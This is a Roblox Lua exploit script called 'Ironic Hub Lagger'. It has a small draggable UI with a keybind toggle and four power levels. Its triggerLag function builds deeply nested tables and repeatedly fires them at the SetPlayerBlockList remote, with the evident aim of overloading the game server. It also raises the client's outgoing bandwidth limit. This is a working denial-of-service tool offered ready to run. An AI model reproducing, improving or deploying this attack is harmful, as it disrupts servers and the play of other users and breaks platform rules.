-- rename by https://discord.gg/TBBAUZu8cW
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

local localPlayer = Players.LocalPlayer
local configFileName = "IronicHubConfig.json"

local lagLevels = {
	v1 = { power = 40, label = "V1" },
	v2 = { power = 50, label = "V2" },
	v3 = { power = 60, label = "V3" },
	v4 = { power = 80, label = "V4" },
}

local activationKey = Enum.KeyCode.M
local isBindingKey = false
local isLaggerActive = false
local lagThread = nil
local currentLevel = "v1"
local isWindowLocked = false
local isSettingsOpen = false

local function saveConfiguration()
	pcall(function()
		writefile(configFileName, HttpService:JSONEncode({
			Keybind = activationKey.Name,
			Nivel = currentLevel,
			Bloqueado = isWindowLocked,
		}))
	end)
end

local function loadConfiguration()
	if pcall(isfile, configFileName) and isfile(configFileName) then
		pcall(function()
			local data = HttpService:JSONDecode(readfile(configFileName))
			activationKey = Enum.KeyCode[data.Keybind] or Enum.KeyCode.M
			local level = data.Nivel or "v1"
			if level == "low" then level = "v1"
			elseif level == "mid" then level = "v2"
			elseif level == "high" then level = "v3"
			elseif level == "ultra" then level = "v4" end
			currentLevel = lagLevels[level] and level or "v1"
			isWindowLocked = data.Bloqueado or false
		end)
	end
end
loadConfiguration()

local function triggerLag(power)
	local payload = {}
	local nestedTable = {{}}
	local pointer = nestedTable[1]
	for i = 1, 25 do 
		local newTable = {} 
		table.insert(pointer, newTable) 
		pointer = newTable 
	end
	local maxIterations = math.min(12000, power * 50)
	for i = 1, maxIterations do 
		table.insert(payload, nestedTable) 
	end
	pcall(function()
		game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(payload)
	end)
end

if CoreGui:FindFirstChild("IronicHub_UI") then
	CoreGui.IronicHub_UI:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "IronicHub_UI"
screenGui.Parent = CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 10)
mainFrame.BorderSizePixel = 0
mainFrame.Size = UDim2.new(0, 240, 0, 100)
mainFrame.Position = UDim2.new(0.5, -120, 0.18, 0)
mainFrame.Parent = screenGui
mainFrame.ClipsDescendants = true
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

local panelStroke = Instance.new("UIStroke", mainFrame)
panelStroke.Color = Color3.fromRGB(35, 35, 42)
panelStroke.Thickness = 1.2
panelStroke.Transparency = 0.2

local titleLabel = Instance.new("TextLabel", mainFrame)
titleLabel.BackgroundTransparency = 1
titleLabel.Position = UDim2.new(0, 12, 0, 6)
titleLabel.Size = UDim2.new(1, -90, 0, 14)
titleLabel.Font = Enum.Font.GothamBlack
titleLabel.Text = "Ironic Hub Lagger"
titleLabel.TextColor3 = Color3.fromRGB(255, 40, 50)
titleLabel.TextSize = 11
titleLabel.TextXAlignment = Enum.TextXAlignment.Left
titleLabel.ZIndex = 5

local settingsButton = Instance.new("TextButton", mainFrame)
settingsButton.Name = "SettingsHide"
settingsButton.Size = UDim2.new(0, 50, 0, 18)
settingsButton.Position = UDim2.new(0, 10, 0, 22)
settingsButton.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
settingsButton.BorderSizePixel = 0
settingsButton.Text = "⚙️ Hide"
settingsButton.TextColor3 = Color3.fromRGB(230, 230, 240)
settingsButton.TextSize = 10
settingsButton.Font = Enum.Font.GothamBold
settingsButton.AutoButtonColor = false
settingsButton.ZIndex = 6
Instance.new("UICorner", settingsButton).CornerRadius = UDim.new(0, 8)

local lockButton = Instance.new("TextButton", mainFrame)
lockButton.Size = UDim2.new(0, 50, 0, 18)
lockButton.Position = UDim2.new(0, 64, 0, 22)
lockButton.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
lockButton.BorderSizePixel = 0
lockButton.Text = "Unlock"
lockButton.TextColor3 = Color3.fromRGB(160, 160, 175)
lockButton.TextSize = 10
lockButton.Font = Enum.Font.GothamBold
lockButton.AutoButtonColor = false
lockButton.ZIndex = 6
Instance.new("UICorner", lockButton).CornerRadius = UDim.new(0, 8)

local keybindButton = Instance.new("TextButton", mainFrame)
keybindButton.Size = UDim2.new(0, 36, 0, 18)
keybindButton.Position = UDim2.new(1, -44, 0, 22)
keybindButton.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
keybindButton.BorderSizePixel = 0
keybindButton.Text = "[" .. activationKey.Name .. "]"
keybindButton.TextColor3 = Color3.fromRGB(200, 200, 220)
keybindButton.TextSize = 10
keybindButton.Font = Enum.Font.GothamBold
keybindButton.AutoButtonColor = false
keybindButton.ZIndex = 6
Instance.new("UICorner", keybindButton).CornerRadius = UDim.new(0, 8)

local toggleBtn = Instance.new("TextButton", mainFrame)
toggleBtn.Name = "Toggle"
toggleBtn.Size = UDim2.new(1, -16, 0, 28)
toggleBtn.Position = UDim2.new(0, 8, 0, 46)
toggleBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
toggleBtn.BorderSizePixel = 0
toggleBtn.Text = "DISABLE"
toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleBtn.TextSize = 13
toggleBtn.Font = Enum.Font.GothamBlack
toggleBtn.AutoButtonColor = false
toggleBtn.ZIndex = 6
Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 10)
local toggleStroke = Instance.new("UIStroke", toggleBtn)
toggleStroke.Color = Color3.fromRGB(50, 50, 58)
toggleStroke.Thickness = 1

local neonLine = Instance.new("Frame", mainFrame)
neonLine.Name = "NeonLine"
neonLine.BorderSizePixel = 0
neonLine.BackgroundColor3 = Color3.fromRGB(255, 30, 40)
neonLine.Size = UDim2.new(1, -16, 0, 2)
neonLine.Position = UDim2.new(0, 8, 1, -8)
neonLine.ZIndex = 8
Instance.new("UICorner", neonLine).CornerRadius = UDim.new(1, 0)
local neonGrad = Instance.new("UIGradient", neonLine)
neonGrad.Color = ColorSequence.new({
	ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 0, 0)),
	ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 45, 55)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(80, 0, 0)),
})
task.spawn(function()
	while neonLine and neonLine.Parent do
		for i = 0, 1, 0.02 do
			neonGrad.Offset = Vector2.new(i, 0)
			task.wait(0.03)
		end
	end
end)

local settingsFrame = Instance.new("Frame")
settingsFrame.Name = "SettingsPanel"
settingsFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 10)
settingsFrame.BorderSizePixel = 0
settingsFrame.Size = UDim2.new(0, 240, 0, 86)
settingsFrame.Position = UDim2.new(0.5, -120, 0.18, 108)
settingsFrame.Visible = false
settingsFrame.Parent = screenGui
settingsFrame.ClipsDescendants = true
Instance.new("UICorner", settingsFrame).CornerRadius = UDim.new(0, 14)
local setStroke = Instance.new("UIStroke", settingsFrame)
setStroke.Color = Color3.fromRGB(35, 35, 42)
setStroke.Thickness = 1.2
setStroke.Transparency = 0.2

local levelBtns = {}
local levelOrder = { "v1", "v2", "v3", "v4" }

local function refreshLevels()
	for key, btn in pairs(levelBtns) do
		local isSelected = (currentLevel == key)
		btn.BackgroundColor3 = isSelected and Color3.fromRGB(255, 30, 40) or Color3.fromRGB(22, 22, 26)
		btn.TextColor3 = isSelected and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(180, 180, 190)
		local stroke = btn:FindFirstChildOfClass("UIStroke")
		if stroke then
			stroke.Color = isSelected and Color3.fromRGB(255, 80, 90) or Color3.fromRGB(45, 45, 52)
			stroke.Transparency = isSelected and 0.05 or 0.25
		end
	end
end

for i, key in ipairs(levelOrder) do
	local b = Instance.new("TextButton", settingsFrame)
	b.Size = UDim2.new(0, 52, 0, 30)
	b.Position = UDim2.new(0, 10 + (i - 1) * 58, 0, 32)
	b.BackgroundColor3 = Color3.fromRGB(22, 22, 26)
	b.BorderSizePixel = 0
	b.Text = lagLevels[key].label
	b.TextColor3 = Color3.fromRGB(180, 180, 190)
	b.TextSize = 12
	b.Font = Enum.Font.GothamBlack
	b.AutoButtonColor = false
	b.ZIndex = 5
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 10)
	local st = Instance.new("UIStroke", b)
	st.Color = Color3.fromRGB(45, 45, 52)
	st.Thickness = 1
	st.Transparency = 0.25
	b.MouseButton1Click:Connect(function()
		currentLevel = key
		refreshLevels()
		saveConfiguration()
	end)
	levelBtns[key] = b
end

local function setToggleVisuals(isActive)
	if isActive then
		toggleBtn.Text = "ENABLE"
		toggleBtn.TextColor3 = Color3.fromRGB(40, 255, 100)
		toggleBtn.BackgroundColor3 = Color3.fromRGB(20, 40, 28)
		toggleStroke.Color = Color3.fromRGB(40, 200, 80)
	else
		toggleBtn.Text = "DISABLE"
		toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
		toggleBtn.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
		toggleStroke.Color = Color3.fromRGB(50, 50, 58)
	end
end

local function toggleLagger()
	isLaggerActive = not isLaggerActive
	setToggleVisuals(isLaggerActive)
	if isLaggerActive then
		if lagThread then task.cancel(lagThread) end
		lagThread = task.spawn(function()
			while isLaggerActive do
				pcall(function()
					game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000)
				end)
				triggerLag(lagLevels[currentLevel].power)
				task.wait(0.18)
			end
		end)
	elseif lagThread then
		task.cancel(lagThread)
		lagThread = nil
	end
end

toggleBtn.MouseButton1Click:Connect(toggleLagger)
setToggleVisuals(false)
refreshLevels()

local reopenBtn = Instance.new("TextButton", screenGui)
reopenBtn.Name = "IronicHubReopen"
reopenBtn.Size = UDim2.new(0, 48, 0, 28)
reopenBtn.Position = UDim2.new(0, 12, 0.18, 0)
reopenBtn.BackgroundColor3 = Color3.fromRGB(8, 8, 10)
reopenBtn.BorderSizePixel = 0
reopenBtn.Text = "⚙️"
reopenBtn.TextColor3 = Color3.fromRGB(255, 40, 50)
reopenBtn.TextSize = 16
reopenBtn.Font = Enum.Font.GothamBlack
reopenBtn.Visible = false
reopenBtn.ZIndex = 20
Instance.new("UICorner", reopenBtn).CornerRadius = UDim.new(0, 10)
Instance.new("UIStroke", reopenBtn).Color = Color3.fromRGB(255, 30, 40)

local function hidePanel()
	isSettingsOpen = false
	settingsFrame.Visible = false
	mainFrame.Visible = false
	reopenBtn.Visible = true
	reopenBtn.Position = mainFrame.Position
end

settingsButton.MouseButton1Click:Connect(function()
	isSettingsOpen = not isSettingsOpen
	settingsButton.Text = isSettingsOpen and "Hide" or "⚙️ Hide"
	settingsFrame.Visible = isSettingsOpen
end)

settingsButton.MouseButton2Click:Connect(hidePanel)
reopenBtn.MouseButton1Click:Connect(function()
	reopenBtn.Visible = false
	mainFrame.Visible = true
end)

local function updateLockVisual()
	lockButton.Text = isWindowLocked and "Lock" or "Unlock"
	lockButton.TextColor3 = isWindowLocked and Color3.fromRGB(255, 80, 90) or Color3.fromRGB(160, 160, 175)
end
updateLockVisual()

lockButton.MouseButton1Click:Connect(function()
	isWindowLocked = not isWindowLocked
	updateLockVisual()
	saveConfiguration()
end)

keybindButton.MouseButton1Click:Connect(function()
	if isBindingKey then return end
	isBindingKey = true
	keybindButton.Text = "[?]"
end)

UserInputService.InputBegan:Connect(function(input, gp)
	if gp then return end
	if isBindingKey and input.KeyCode ~= Enum.KeyCode.Unknown then
		activationKey = input.KeyCode
		keybindButton.Text = "[" .. activationKey.Name .. "]"
		isBindingKey = false
		saveConfiguration()
		return
	end
	if input.KeyCode == activationKey then
		toggleLagger()
	end
end)

local isDragging, dragStart, startPos = false, nil, nil
mainFrame.InputBegan:Connect(function(input)
	if isWindowLocked or (input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch) then return end
	isDragging = true
	dragStart = input.Position
	startPos = mainFrame.Position
end)

UserInputService.InputChanged:Connect(function(input)
	if not isDragging or isWindowLocked then return end
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		local delta = input.Position - dragStart
		local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		mainFrame.Position = newPos
		settingsFrame.Position = UDim2.new(newPos.X.Scale, newPos.X.Offset, newPos.Y.Scale, newPos.Y.Offset + 108)
	end
end)

mainFrame.InputEnded:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		isDragging = false
	end
end)
